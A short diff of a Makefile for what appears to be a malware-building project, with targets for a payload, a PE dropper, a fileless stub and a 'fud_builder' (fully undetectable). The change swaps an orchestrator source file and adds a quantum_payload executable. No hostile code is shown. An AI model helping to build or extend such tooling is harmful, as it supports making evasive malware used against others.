@@ -26,7 +26,7 @@ BINDIR = $(BUILDDIR)/bin
 CORE_MASM_SRC = core_masm_bot/core_payload.c
 PE_BUILDER_SRC = pe_builder/pe_dropper.cpp
 STUB_GENERATOR_SRC = stub_generator/fileless_stub.cpp
-ORCHESTRATOR_SRC = orchestrator/build_manager.cpp
+ORCHESTRATOR_SRC = orchestrator/build_manager_simple.cpp
 QUANTUM_SRC = quantum_module/quantum_payload.c
 
 # Object files
@@ -41,6 +41,7 @@ CORE_MASM_EXE = $(BINDIR)/core_payload.exe
 PE_BUILDER_EXE = $(BINDIR)/pe_dropper.exe
 STUB_GENERATOR_EXE = $(BINDIR)/fileless_stub.exe
 ORCHESTRATOR_EXE = $(BINDIR)/fud_builder.exe
+QUANTUM_EXE = $(BINDIR)/quantum_payload.exe
 
 # All targets
 ALL_TARGETS = $(CORE_MASM_EXE) $(PE_BUILDER_EXE) $(STUB_GENERATOR_EXE) $(ORCHESTRATOR_EXE) $(QUANTUM_EXE)
